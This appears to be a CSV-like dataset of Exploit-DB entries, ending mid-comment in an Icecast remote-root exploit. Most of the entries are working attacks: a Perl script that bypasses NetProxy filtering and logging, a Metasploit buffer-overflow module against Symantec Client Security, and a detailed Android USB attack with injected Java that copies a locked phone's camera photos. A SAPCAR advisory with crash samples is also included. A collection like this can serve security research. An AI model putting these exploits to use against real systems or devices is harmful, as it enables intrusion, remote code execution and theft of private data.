3381,"NetProxy 4.03 - Web Filter Evasion / Bypass Logging #!/usr/bin/perl ########################################################################### # # Application:  # #	 NetProxy 4.03 #	 http://www.grok.co.uk/netproxy/index.html # # Description: # #	 NetProxy includes a powerful web cache to boost  #	 performance and reduce online costs. There is  #	 also an application-level firewall to protect your  #	 network from unwanted access, full access logging  #	 to allow you to track Internet usage, and  #	 password-protected access to various Internet resources. # # Vulnerability: # #	 Sending a specially crafted request to the proxy server  #	 allows users to view restricted Web content and bypass #	 the logging feature. # # Exploit: # #	 Assume that access to http://www.milw0rm.com has been blocked.  #	 The standard query string sent to NetProxy looks like: # #			GET http://www.milw0rm.com HTTP/1.0 # #	 NetProxy recognizes that this is a blocked URL and subsequently  #	 blocks the request. However, sending a request without 'http://'  #	 in the URL allows access to the blocked URL (note that the port  #	 must be manually specified as well): # #			GET www.milw0rm.com:80 HTTP/1.0 # #	 In addition, requests made in this manner are not logged to  # 	 NetProxy's connection log file.  # # Work-Around/Fix: # #	 Since the application automatically prepends the 'http://' string #	 to every URL specified in the block list, this technique should work  #	 for all restricted Web sites, and ensures that there is no easy fix  #	 for this security hole. POC code follows. # # Credit: # #	 Exploit discovered and coded by Craig Heffner #	 http://www.craigheffner.com #	 heffnercj [at] gmail.com ###########################################################################  use IO::Socket;  #Define the NetProxy server and port $proxy_ip = ""127.0.0.1""; $proxy_port = ""8080"";  #Set the site, port and page to request $site = ""www.milw0rm.com""; $port = ""80""; $page = ""index.html"";  #Define FF and IE user agent strings $ms_ie = ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)""; $ms_ff = ""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1"";  #Create connection to NetProxy my $sock = new IO::Socket::INET( 			Proto => 'tcp', 			PeerAddr => $proxy_ip, 			PeerPort => $proxy_port, 			); die ""Failed to connect to [$proxy_ip:$proxy_port] : $!\n"" unless $sock;	  #Format the request $request = ""GET $site:$port/$page HTTP/1.0\r\n""; $request .= ""User-Agent: $ms_ff\r\n""; $request .= ""\r\n"";  #Send the request print $sock $request;  #Read the reply while(<$sock>){ 	$reply .= $_; }  close($sock);  #Separate NetProxy header from HTML ($header,$html) = split(""\r\n\r"",$reply);  print $html;  exit;  # milw0rm.com [2007-02-27]",Sending a specially crafted request to the proxy server,1
45192,"Android - Directory Traversal over USB via Injection in blkid Output When a USB mass storage device is inserted into an Android phone (even if the phone is locked!), vold will attempt to automatically mount partitions from the inserted device. For this purpose, vold has to identify the partitions on the connected device and collect some information about them, which is done in readMetadata() in system/vold/Utils.cpp. This function calls out to ""blkid"", then attempts to parse the results:       std::vector<std::string> cmd;     cmd.push_back(kBlkidPath);     cmd.push_back(""-c"");     cmd.push_back(""/dev/null"");     cmd.push_back(""-s"");     cmd.push_back(""TYPE"");     cmd.push_back(""-s"");     cmd.push_back(""UUID"");     cmd.push_back(""-s"");     cmd.push_back(""LABEL"");     cmd.push_back(path);      std::vector<std::string> output;     status_t res = ForkExecvp(cmd, output, untrusted ? sBlkidUntrustedContext : sBlkidContext);     if (res != OK) {         LOG(WARNING) << ""blkid failed to identify "" << path;         return res;     }      char value[128];     for (const auto& line : output) {         // Extract values from blkid output, if defined         const char* cline = line.c_str();         const char* start = strstr(cline, ""TYPE="");         if (start != nullptr && sscanf(start + 5, ""\""%127[^\""]\"""", value) == 1) {             fsType = value;         }          start = strstr(cline, ""UUID="");         if (start != nullptr && sscanf(start + 5, ""\""%127[^\""]\"""", value) == 1) {             fsUuid = value;         }          start = strstr(cline, ""LABEL="");         if (start != nullptr && sscanf(start + 6, ""\""%127[^\""]\"""", value) == 1) {             fsLabel = value;         }     }   Normally, the UUID string can't contain any special characters because blkid generates it by reformatting a binary ID as a printable UUID string. However, the version of blkid that Android is using will print the LABEL first, without escaping the characters this code scans for, allowing an attacker to place special characters in the fsUuid variable.   For example, if you format a USB stick with a single partition, then place a romfs filesystem in the partition as follows (on the terminal of a Linux PC):      # echo '-rom1fs-########TYPE=""vfat"" UUID=""../../data""' > /dev/sdc1  and then connect the USB stick to a Nexus 5X and run blkid as root on the device, you'll see the injection:      bullhead:/ # blkid -c /dev/null -s TYPE -s UUID -s LABEL /dev/block/sda1     /dev/block/sda1: LABEL=""TYPE=""vfat"" UUID=""../../data"""" TYPE=""romfs""   logcat shows that the injection was successful and the device is indeed using the injected values, but vold doesn't end up doing much with the fake UUID because fsck_msdos fails:  05-29 20:41:26.262   391   398 V vold    : /dev/block/vold/public:8,1: LABEL=""TYPE=""vfat"" UUID=""../../data"""" TYPE=""romfs""  05-29 20:41:26.262   391   398 V vold    :  05-29 20:41:26.263   391   398 V vold    : /system/bin/fsck_msdos 05-29 20:41:26.263   391   398 V vold    :     -p 05-29 20:41:26.263   391   398 V vold    :     -f 05-29 20:41:26.263   391   398 V vold    :     /dev/block/vold/public:8,1 05-29 20:41:26.264   813  2039 D VoldConnector: RCV <- {652 public:8,1 vfat} 05-29 20:41:26.264   813  2039 D VoldConnector: RCV <- {653 public:8,1 ../../data} 05-29 20:41:26.265   813  2039 D VoldConnector: RCV <- {654 public:8,1 TYPE=} 05-29 20:41:26.281   391   398 I fsck_msdos: ** /dev/block/vold/public:8,1 05-29 20:41:26.285   391   398 I fsck_msdos: Invalid sector size: 8995 05-29 20:41:26.286   391   398 I fsck_msdos: fsck_msdos terminated by exit(8) 05-29 20:41:26.286   391   398 E Vold    : Filesystem check failed (no filesystem) 05-29 20:41:26.286   391   398 E vold    : public:8,1 failed filesystem check 05-29 20:41:26.286   813  2039 D VoldConnector: RCV <- {651 public:8,1 6} 05-29 20:41:26.287   813  2039 D VoldConnector: RCV <- {400 48 Command failed} 05-29 20:41:26.288  2532  2532 D StorageNotification: Notifying about public volume: VolumeInfo{public:8,1}: 05-29 20:41:26.288  2532  2532 D StorageNotification:     type=PUBLIC diskId=disk:8,0 partGuid=null mountFlags=0 mountUserId=0  05-29 20:41:26.288  2532  2532 D StorageNotification:     state=UNMOUNTABLE  05-29 20:41:26.288  2532  2532 D StorageNotification:     fsType=vfat fsUuid=../../data fsLabel=TYPE=  05-29 20:41:26.288  2532  2532 D StorageNotification:     path=null internalPath=null    For a relatively harmless example in which vold actually ends up mounting the device in the wrong place, you can create a vfat partition with label 'UUID=""../##':      # mkfs.vfat -n 'PLACEHOLDER' /dev/sdc1     mkfs.fat 4.1 (2017-01-24)     # dd if=/dev/sdc1 bs=1M count=200 | sed 's|PLACEHOLDER|UUID=""../##|g' | dd of=/dev/sdc1 bs=1M     200+0 records in     200+0 records out     209715200 bytes (210 MB, 200 MiB) copied, 1.28705 s, 163 MB/s     198+279 records in     198+279 records out     209715200 bytes (210 MB, 200 MiB) copied, 2.60181 s, 80.6 MB/s  Connect it to the Android device again while running strace against vold:      [pid   398] newfstatat(AT_FDCWD, ""/mnt/media_rw/../##"", 0x7d935fe708, AT_SYMLINK_NOFOLLOW) = -1 ENOENT (No such file or directory)     [pid   398] mkdirat(AT_FDCWD, ""/mnt/media_rw/../##"", 0700) = 0     [pid   398] fchmodat(AT_FDCWD, ""/mnt/media_rw/../##"", 0700) = 0     [pid   398] fchownat(AT_FDCWD, ""/mnt/media_rw/../##"", 0, 0, 0) = 0     [pid   398] mount(""/dev/block/vold/public:8,1"", ""/mnt/media_rw/../##"", ""vfat"", MS_NOSUID|MS_NODEV|MS_NOEXEC|MS_DIRSYNC|MS_NOATIME, ""utf8,uid=1023,gid=1023,fmask=7,d""...) = 0     [pid   398] faccessat(AT_FDCWD, ""/mnt/media_rw/../##/LOST.DIR"", F_OK) = -1 ENOENT (No such file or directory)     [pid   398] mkdirat(AT_FDCWD, ""/mnt/media_rw/../##/LOST.DIR"", 0755) = 0  Check the results:      bullhead:/ # ls -l /mnt     total 32     drwxrwx--- 3 media_rw media_rw 32768 2018-05-29 20:54 ##     drwx--x--x 2 root     root        40 1970-01-01 04:14 appfuse     drwxr-xr-x 2 root     system      40 1970-01-01 04:14 asec     drwxrwx--x 2 system   system      40 1970-01-01 04:14 expand     drwxr-x--- 2 root     media_rw    40 1970-01-01 04:14 media_rw     drwxr-xr-x 2 root     system      40 1970-01-01 04:14 obb     drwx------ 5 root     root       100 1970-01-01 04:14 runtime     lrwxrwxrwx 1 root     root        21 1970-01-01 04:14 sdcard -> /storage/self/primary     drwx------ 3 root     root        60 1970-01-01 04:14 secure     drwxr-xr-x 3 root     root        60 1970-01-01 04:14 user     bullhead:/ # mount | grep '##'     /dev/block/vold/public:8,1 on /mnt/## type vfat (rw,dirsync,nosuid,nodev,noexec,noatime,uid=1023,gid=1023,fmask=0007,dmask=0007,allow_utime=0020,codepage=437,iocharset=iso8859-1,shortname=mixed,utf8,errors=remount-ro)   When testing with a normal USB stick, the attacker has to choose between using a vfat filesystem (so that Android is capable of mounting it as external storage) and using a romfs filesystem (so that the label is long enough to specify arbitrary paths). However, an attacker who wants to perform more harmful attacks could use a malicious USB storage device that is capable of delivering different data for multiple reads from the same location. This way, it would be possible to deliver a romfs superblock when blkfs is reading, but deliver a vfat superblock when the kernel is reading. I haven't tested this yet because I don't yet have the necessary hardware.   When you fix this issue, please don't just fix the injection and/or the directory traversal. I believe that from a security perspective, a smartphone should not mount storage devices that are inserted while the screen is locked (or, more generally, communication with new USB devices should be limited while the screen is locked). Mounting a USB storage device exposes a lot of code to the connected device, including partition table parsing, vold logic, blkid, the kernel's FAT filesystem implementation, and anything on the device that might decide to read files from the connected storage device.   ############################################################  This is a PoC for stealing photos from the DCIM folder of a Pixel 2 running build OPM2.171026.006.C1 while the device is locked. You will need a Pixel 2 as victim device, a corresponding AOSP build tree, a Raspberry Pi Zero W (or some other device you can use for device mode USB), a powered USB hub, and some cables.  The victim phone must be powered on, the disk encryption keys must be unlocked (meaning that you must have entered your PIN/passphrase at least once since boot), and the attack probably won't work if someone has recently (since the last reboot) inserted a USB stick into the phone.   Configure the Raspberry Pi Zero W such that it is usable for gadget mode (see e.g. https://gist.github.com/gbaman/50b6cca61dd1c3f88f41).  Apply the following patch to frameworks/base in your AOSP build tree:  ========================================= diff --git a/packages/ExternalStorageProvider./src/com/android/externalstorage/MountReceiver.java b/packages/ExternalStorageProvider/src/com/android/externalstorage/MountReceiver.java index 8a6c7d68525..73be5818da1 100644 --- a/packages/ExternalStorageProvider/src/com/android/externalstorage/MountReceiver.java +++ b/packages/ExternalStorageProvider/src/com/android/externalstorage/MountReceiver.java @@ -20,10 +20,38 @@ import android.content.BroadcastReceiver;  import android.content.ContentProviderClient;  import android.content.Context;  import android.content.Intent; +import java.io.File; +import java.io.FileInputStream; +import java.io.FileOutputStream;    public class MountReceiver extends BroadcastReceiver {      @Override      public void onReceive(Context context, Intent intent) { +        System.logE(""MOUNTRECEIVER CODE INJECTED, GRABBING FILES...""); +        try { +            File exfiltration_dir = new File(""/data/exfiltrated-photos""); +            exfiltration_dir.mkdir(); +            File camera_dir = new File(""/storage/emulated/0/DCIM/Camera""); +            File[] camera_files = camera_dir.listFiles(); +            for (File camera_file: camera_files) { +                System.logE(""GRABBING '""+camera_file.getName()+""'""); +                File exfiltrated_file = new File(exfiltration_dir, camera_file.getName()); +                exfiltrated_file.delete(); +                FileInputStream ins = new FileInputStream(camera_file); +                FileOutputStream outs = new FileOutputStream(exfiltrated_file); +                byte[] buf = new byte[4096]; +                int len; +                while ((len=ins.read(buf)) > 0) { +                    outs.write(buf, 0, len); +                } +                ins.close(); +                outs.close(); +            } +        } catch (Exception e) { +            throw new RuntimeException(e); +        } +        System.logE(""INJECTED CODE DONE""); +          final ContentProviderClient client = context.getContentResolver()                  .acquireContentProviderClient(ExternalStorageProvider.AUTHORITY);          try { =========================================  Then build the tree (""lunch aosp_walleye-userdebug"", then build with ""make"").  Zip the classes.dex build artifact of ExternalStorageProvider:  $ zip -jX zipped_dexfile ~/aosp-walleye/out/target/common/obj/APPS/ExternalStorageProvider_intermediates/classes.dex   adding: classes.dex (deflated 49%) $ mv zipped_dexfile.zip zipped_dexfile  Download the factory image for OPM2.171026.006.C1 and unpack its system partition, e.g. using commands roughly as follows:  $ unzip image-walleye-opm2.171026.006.c1.zip $ ~/aosp-walleye/out/host/linux-x86/bin/simg2img system.img system.img.raw # convert sparse image to normal $ echo 'rdump / walleye-opm2.171026.006.c1/unpacked_system/' | debugfs -f- walleye-opm2.171026.006.c1/unpacked_image/system.img.raw 2>/dev/null # extract filesystem image  Now build the classes.dex build artifact into an odex file and a vdex file, linking against boot.art from the factory image:  $ ~/aosp-walleye/out/host/linux-x86/bin/dex2oat --runtime-arg -Xms64m --runtime-arg -Xmx512m --class-loader-context='&' --boot-image=/home/user/google_walleye/walleye-opm2.171026.006.c1/unpacked_system/system/framework/boot.art --dex-file=zipped_dexfile --dex-location=/system/priv-app/ExternalStorageProvider/ExternalStorageProvider.apk --oat-file=package.odex --android-root=/home/user/google_walleye/walleye-opm2.171026.006.c1/unpacked_system/system --instruction-set=arm64 --instruction-set-variant=cortex-a73 --instruction-set-features=default --runtime-arg -Xnorelocate --compile-pic --no-generate-debug-info --generate-build-id --abort-on-hard-verifier-error --force-determinism --no-inline-from=core-oj.jar --compiler-filter=quicken  The resulting vdex file would not be accepted by the phone because of a CRC32 checksum mismatch; to fix it up, compile the attached vdex_crc32_fixup.c and use it to overwrite the CRC32 checksum with the expected one from the factory image:  $ ./vdex_crc32_fixup package.vdex ~/google_walleye/walleye-opm2.171026.006.c1/unpacked_system/system/priv-app/ExternalStorageProvider/ExternalStorageProvider.apk  original crc32: d0473780 new crc32: 84c10ae9 vdex patched  Prepare two disk images, each with a MBR partition table and a single partition. Their partition tables should be identical. In the first image's partition, place a fake romfs filesystem that triggers the vold bug:  # echo -e '-rom1fs-########TYPE=""vfat"" UUID=""../../data""\0' > /dev/sdd1  Format the second image's partition with FAT32, and create the following directory structure inside that filesystem (the ""system@"" entries are files, the rest are directories):  ├── dalvik-cache │   └── arm64 │       ├── system@framework@boot.art │       ├── system@priv-app@ExternalStorageProvider@ExternalStorageProvider.apk@classes.dex │       └── system@priv-app@ExternalStorageProvider@ExternalStorageProvider.apk@classes.vdex ├── LOST.DIR ├── misc │   └── profiles │       └── cur │           └── 0 │               └── com.android.externalstorage ├── user │   └── 0 │       └── com.android.externalstorage │           └── cache └── user_de     └── 0         └── com.android.externalstorage             └── code_cache  The three system@ files should have the following contents:   - system@framework@boot.art should be a copy of system/framework/arm64/boot.art    from the system image.  - system@priv-app@ExternalStorageProvider@ExternalStorageProvider.apk@classes.dex    should be the generated package.odex.  - system@priv-app@ExternalStorageProvider@ExternalStorageProvider.apk@classes.vdex    should be the fixed-up package.vdex.  Copy the two disk images to the Raspberry Pi Zero W; the fake romfs image should be named ""disk_image_blkid"", the image with FAT32 should be named ""disk_image_mount"". On the Pi, build the fuse_intercept helper:  $ gcc -Wall fuse_intercept.c `pkg-config fuse --cflags --libs` -o fuse_intercept  Then create a directory ""mount"" and launch fuse_intercept.  In a second terminal, tell the Pi's kernel to present the contents of the mount point as a mass storage device:  pi@raspberrypi:~ $ sudo modprobe dwc2 pi@raspberrypi:~ $ sudo modprobe g_mass_storage file=/home/pi/mount/wrapped_image stall=0   To run the attack, connect the Pi to the powered USB hub as a device. Then use a USB-C OTG adapter (unless you have some fancy USB-C hub, I guess?) to connect the powered hub to the locked phone, with the phone in USB host mode.  At this point, the phone should first mount the USB stick over /data, then immediately afterwards launch com.android.externalstorage/.MountReceiver:  06-05 21:58:20.988   656   665 I Vold    : Filesystem check completed OK 06-05 21:58:20.988  1115  1235 D VoldConnector: RCV <- {656 public:8,97 /mnt/media_rw/../../data} 06-05 21:58:20.990  1115  1235 D VoldConnector: RCV <- {655 public:8,97 /mnt/media_rw/../../data} 06-05 21:58:21.004  1115  1235 D VoldConnector: RCV <- {651 public:8,97 2} 06-05 21:58:21.004  1115  1115 W android.fg: type=1400 audit(0.0:33): avc: denied { write } for name=""/"" dev=""sdg1"" ino=1 scontext=u:r:system_server:s0 tcontext=u:object_r:vfat:s0 tclass=dir permissive=0 06-05 21:58:21.006  1115  1235 D VoldConnector: RCV <- {200 7 Command succeeded} 06-05 21:58:21.004  1115  1115 W android.fg: type=1400 audit(0.0:34): avc: denied { write } for name=""/"" dev=""sdg1"" ino=1 scontext=u:r:system_server:s0 tcontext=u:object_r:vfat:s0 tclass=dir permissive=0 06-05 21:58:21.008  1335  1335 D StorageNotification: Notifying about public volume: VolumeInfo{public:8,97}: 06-05 21:58:21.008  1335  1335 D StorageNotification:     type=PUBLIC diskId=disk:8,96 partGuid=null mountFlags=0 mountUserId=0  06-05 21:58:21.008  1335  1335 D StorageNotification:     state=MOUNTED  06-05 21:58:21.008  1335  1335 D StorageNotification:     fsType=vfat fsUuid=../../data fsLabel=TYPE=  06-05 21:58:21.008  1335  1335 D StorageNotification:     path=/mnt/media_rw/../../data internalPath=/mnt/media_rw/../../data  06-05 21:58:21.020  1115  1129 I ActivityManager: Start proc 4478:com.android.externalstorage/u0a35 for broadcast com.android.externalstorage/.MountReceiver  Most processes can't access the vfat filesystem that is now mounted at /data either because they lack the necessary groups or because of some SELinux rule. But com.android.externalstorage passes both checks and can read and write (but not execute) files from the new /data. Bytecode is loaded from /data/dalvik-cache/arm64/system@priv-app@ExternalStorageProvider@ExternalStorageProvider.apk@classes.vdex and then interpreted, allowing the attacker to steal photos from the device (since com.android.externalstorage has access to /storage/emulated/0):  06-05 21:58:21.248  4478  4478 I zygote64: The ClassLoaderContext is a special shared library. 06-05 21:58:21.276  4478  4478 W zygote64: JIT profile information will not be recorded: profile file does not exits. 06-05 21:58:21.278  4478  4478 W asset   : failed to open idmap file /data/resource-cache/vendor@overlay@Pixel@PixelThemeOverlay.apk@idmap 06-05 21:58:21.326  4478  4478 D ExternalStorage: After updating volumes, found 3 active roots 06-05 21:58:21.334  4478  4478 E System  : MOUNTRECEIVER CODE INJECTED, GRABBING FILES... 06-05 21:58:21.343  4478  4478 E System  : GRABBING 'IMG_20180605_212044.jpg' 06-05 21:58:21.419  4478  4478 E System  : GRABBING 'IMG_20180605_215031.jpg' 06-05 21:58:21.428  2218  2218 W SQLiteLog: (28) file renamed while open: /data/user/0/com.google.android.gms/databases/config.db 06-05 21:58:21.465  4478  4478 E System  : INJECTED CODE DONE   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45192.zip","format a USB stick with a single partition,",1
16830,"Symantec Remote Management - Remote Buffer Overflow (Metasploit) ## # $Id: symantec_rtvscan.rb 9262 2010-05-09 17:45:00Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GoodRanking  	include Msf::Exploit::Remote::Tcp  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Symantec Remote Management Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack buffer overflow in Symantec Client Security 3.0.x. 				This module has only been tested against Symantec Client Security 3.0.2 				build 10.0.2.2000. 			}, 			'Author'         => [ 'MC' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 9262 $', 			'References'     => 				[ 					['CVE', '2006-2630'], 					['OSVDB', '25846'], 					['BID', '18107'], 					['URL', 'http://research.eeye.com/html/advisories/published/AD20060612.html'], 				], 			'Privileged'     => true,  			'DefaultOptions' => 				{ 					'EXITFUNC' => 'thread', 				}, 			'Payload'        => 				{ 					'Space'    => 500, 					'BadChars' => ""\x00"", 					'PrependEncoder' => ""\x81\xc4\xff\xef\xff\xff\x44"", 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'SCS 3.0.2 build 10.0.2.2000', { 'Ret' => 0x69985624 } ], # Dec2TAR.dll 				], 			'DefaultTarget' => 0, 			'DisclosureDate' => 'May 24 2006'))  		register_options( 			[ 				Opt::RPORT(2967) 			], self.class) 	end  	def exploit 		connect  		header =  ""\x01\x10\x0a\x20\x0a\x00\x00\x00"" 		header << ""\x02\x18\x00\x01\x00\x00\x00\x00"" 		header << ""\x00\x24\x00\x14\xb7\xc9\xd2\xd9"" 		header << ""\x3e\x33\xef\x34\x25\x1f\x43\x00""  		crufta =  rand_text_alphanumeric(512) 		cruftb =  rand_text_alphanumeric(514) 		cruftc =  payload.encoded + rand_text_alphanumeric(513 - payload.encoded.length) 		cruftd =  rand_text_alphanumeric(495)  		cruftd[479, 2] = ""\xeb\x06"" 		cruftd[483, 4] = [target.ret].pack('V') 		cruftd[487, 5] = [0xe8, -1000].pack('CV')  		cruftd << rand_text_alphanumeric(21) 		crufte =  rand_text_alphanumeric(6) + ""\x19\x00\x00\x00"" 		crufte << rand_text_alphanumeric(504) + ""\x00\x00""  		overflow =  [ crufta.length ].pack('v') + crufta 		overflow << [ cruftb.length ].pack('v') + cruftb 		overflow << [ cruftc.length ].pack('v') + cruftc 		overflow << [ cruftd.length ].pack('v') + cruftd 		overflow << [ crufte.length ].pack('v') + crufte  		sploit = header + overflow  		print_status(""Trying target #{target.name}..."") 		sock.put(sploit)  		handler 		disconnect 	end  end",a specially crafted RPC request,1
40230,"SAP SAPCAR - Multiple Vulnerabilities 1. Advisory Information  Title: SAP CAR Multiple Vulnerabilities Advisory ID: CORE-2016-0006 Advisory URL: http://www.coresecurity.com/advisories/sap-car-multiple-vulnerabilities Date published: 2016-08-09 Date of last update: 2016-08-09 Vendors contacted: SAP Release mode: Coordinated release  2. Vulnerability Information  Class: Unchecked Return Value [CWE-252], TOCTOU Race Condition [CWE-367] Impact: Denial of service, Security bypass Remotely Exploitable: No Locally Exploitable: Yes CVE Name: CVE-2016-5845, CVE-2016-5847  3. Vulnerability Description  SAP [1] distributes software and packages using an archive program called SAPCAR. This program uses a custom archive file format. Vulnerabilities were found in the extraction of specially crafted archive files, that could lead to local denial of service conditions or privilege escalation.  4. Vulnerable Packages  SAPCAR archive tool Other products and versions might be affected, but they were not tested.  5. Vendor Information, Solutions and Workarounds  SAP published the following Security Notes:  2312905 2327384  6. Credits  This vulnerability was discovered and researched by Martin Gallo from Core Security Consulting Services. The publication of this advisory was coordinated by Joaquin Rodriguez Varela from Core Advisories Team.  7. Technical Description / Proof of Concept Code  SAP distributes software and packages using an archive program called SAPCAR. This program uses a custom archive file format. Vulnerabilities were found in the extraction of specially crafted archive files, that could lead to denial of service conditions or escalation of privileges.  The code that handles the extraction of archive files is prone to privilege escalation and denial of service vulnerabilities.  7.1. Denial of service via invalid file names  [CVE-2016-5845] Denial of service vulnerability due the SAPCAR program not checking the return value of file operations when extracting files. This might result in the program crashing when trying to extract files from an specially crafted archive file that contains invalid file names for the target platform. Of special interest are applications or solutions that makes use of SAPCAR in an automated way.  The following is a proof of concept to demonstrate the vulnerability:            $ xxd SAPCAR_crash.SAR          0000000: 4341 5220 322e 3031 4452 0081 0000 0f00  CAR 2.01DR......         0000010: 0000 0000 0000 0000 0000 d4f8 e555 0000  .............U..         0000020: 0000 0000 0000 0000 1000 696e 7075 742d  ..........input-         0000030: 6469 722f 696e 7090 7400 4544 1a00 0000  dir/inp.t.ED....         0000040: 0f00 0000 121f 9d02 7bc1 23b9 a90a 25a9  ........{.#...%.         0000050: 1525 0a69 9939 a95c 0000 857f b95a       .%.i.9.\.....Z                  $ ./SAPCAR -dvf SAPCAR_crash.SAR         SAPCAR: processing archive SAPCAR_crash.SAR (version 2.01)         d input-dir/inp#t         SAPCAR: checksum error in input-dir/inp#t (error 12). No such file or director                  $ ./SAPCAR -xvf SAPCAR_crash.SAR         SAPCAR: processing archive SAPCAR_crash.SAR (version 2.01)         x input-dir/inp#t         Segmentation fault   7.2. Race condition on permission change  [CVE-2016-5847] Race condition vulnerability due to the way the SAPCAR program change the permissions of extracted files. If a malicious local user has access to a directory where a user is extracting files using SAPCAR, the attacker might use this vulnerability to change the permissions of arbitrary files belonging to the user.  The SAPCAR program writes the file being extracted and after closing it, the program changes the permissions to the ones set on the archive file. There's a time gap between the creating of the file and the change of the permissions. During this time frame, a malicious local user can replace the extracted file with a hard link to a file belonging to another user, resulting in the SAPCAR program changing the permissions on the hard-linked file to be the same as that of the compressed file.  The following is a proof of concept to demonstrate the vulnerability:          $ xxd SAPCAR_race_condition.SAR       0000000: 4341 5220 322e 3031 5247 b481 0000 2b00  CAR 2.01RG....+.       0000010: 0000 0000 0000 0000 0000 d023 5e56 0000  ...........#^V..       0000020: 0000 0000 0000 0000 1000 7465 7374 5f73  ..........test_s       0000030: 7472 696e 672e 7478 7400 4544 3500 0000  tring.txt.ED5...       0000040: 2b00 0000 121f 9d02 7b21 19a9 0a85 a599  +.......{!......       0000050: c9d9 0a49 45f9 e579 0a69 f915 0a59 a5b9  ...IE..y.i...Y..       0000060: 05c5 0af9 65a9 450a 2540 e99c c4aa 4a85  ....e.E.%@....J.       0000070: 94fc 7400 0008 08c6 b9                   ..t......              $ ./SAPCAR -tvf SAPCAR_race_condition.SAR        SAPCAR: processing archive SAPCAR_race_condition.SAR (version 2.01)       -rw-rw-r--          43    01 Dec 2015 19:48 test_string.txt              $ strace ./SAPCAR -xvf SAPCAR_race_condition.SAR        execve(""./SAPCAR"", [""./SAPCAR"", ""-xvf"", ""SAPCAR_race_condition.SAR""], [/* 76 vars */]) = 0       [..]       open(""test_string.txt"", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 4       mmap(NULL, 323584, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f98c4704000       fstat(4, {st_mode=S_IFREG|0664, st_size=0, ...}) = 0       mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f98c475c000       write(4, ""The quick brown fox jumps over t""..., 43) = 43       close(4)                                = 0       munmap(0x7f98c475c000, 4096)            = 0       utime(""test_string.txt"", [2015/12/01-19:48:48, 2015/12/01-19:48:48]) = 0       chmod(""test_string.txt"", 0664)          = 0       [..]         8. Report Timeline  2016-04-21: Core Security sent an initial notification to SAP. 2016-04-22: SAP confirmed the reception of the email and requested the draft version of the advisory. 2016-04-22: Core Security sent SAP a draft version of the advisory and informed them we would adjust our publication schedule according with the release of a solution to the issues. 2016-04-25: SAP confirmed the reported vulnerabilities and assigned the following security incident tickets IDs: 1670264798, 1670264799 and 1670264800. 2016-05-10: Core Security asked SAP if they had a tentative date for publishing the security fixes. 2016-05-20: SAP informed Core Security they have a tentative release date on July 12th, 2016 (July Patch day). 2016-05-23: Core Security thanked SAP for the tentative date and informed them we would publish our security advisory accordingly upon their confirmation. 2016-06-27: Core Security requested SAP the tentative security notes numbers and links in order to add them to our security advisory. 2016-07-05: SAP informed Core Security they due to some issues found during their testing phase of the patches they were not in a position to ship the patches as part of their July patch day. They said they would be able to ship the patches with August patch day. 2016-07-06: Core Security requested SAP the specific day in August they planed to release the patches. 2016-07-20: Core Security requested again SAP the specific day in August they planed to release the patches. 2016-07-21: SAP informed Core Security they would publish their security notes on the 9th of August. 2016-08-10: Advisory CORE-2016-0006 published. 9. References  [1] http://go.sap.com/.   10. About CoreLabs  CoreLabs, the research center of Core Security, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.  11. About Core Security  Courion and Core Security have rebranded the combined company, changing its name to Core Security, to reflect the company’s strong commitment to providing enterprises with market-leading, threat-aware, identity, access and vulnerability management solutions that enable actionable intelligence and context needed to manage security risks across the enterprise. Core Security’s analytics-driven approach to security enables customers to manage access and identify vulnerabilities, in order to minimize risks and maintain continuous compliance. Solutions include Multi-Factor Authentication, Provisioning, Identity Governance and Administration (IGA), Identity and Access Intelligence (IAI), and Vulnerability Management (VM). The combination of these solutions provides context and shared intelligence through analytics, giving customers a more comprehensive view of their security posture so they can make more informed, prioritized, and better security remediation decisions.  Core Security is headquartered in the USA with offices and operations in South America, Europe, Middle East and Asia. To learn more, contact Core Security at (678) 304-4500 or info@coresecurity.com.  12. Disclaimer  The contents of this advisory are copyright (c) 2016 Core Security and (c) 2016 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/  13. PGP/GPG Keys  This advisory has been signed with the GPG key of Core Security advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc.",specially crafted archive files,1
21363,"Icecast 1.x - AVLLib Buffer Overflow // source: https://www.securityfocus.com/bid/4415/info  Icecast is a freely available, open source streaming audio server. Icecast is available for the Unix, Linux, and Microsoft Windows platforms.  Icecast does not properly check bounds on data sent from clients. Because of this, it is possible for a remote user to send an arbitrarily long string of data to the server, which could result in a stack overflow, and the execution of user supplied code. The code would be executed with the privileges of the Icecast server.   /*  all content is (c) #temp 2002 and may not be  *  (re)published in any form or (re)distributed   *  without written permission of the author (diz)   *  *   * 	icx.c -- icecast remote shell/root    *  *  * Found 15-02-2002...exploited 16-02-2002 ;P	  *  * Affected:  *  all versions up to 1.3.11 (current)   *   * the client_login() function is passed the full GET %s HTTP/1.0  * string provided by a mp3 client. Somewhere along the way an evil   * string function overflows buffer bounds with our humpage.. We can   * overflow just enough to reach and overwrite an instruction pointer.   * Humpage occurs somewhere in the handling of the request string  * between mount searching and request building...Havent been able  * to locate the exact spot as of yet (just discovered bug yesterday   * investigating another possible overflow in icecast extract_vars()   * funtion) Also some libavl routines look mighty guilty..especially   * avl_destroy. I cant really be 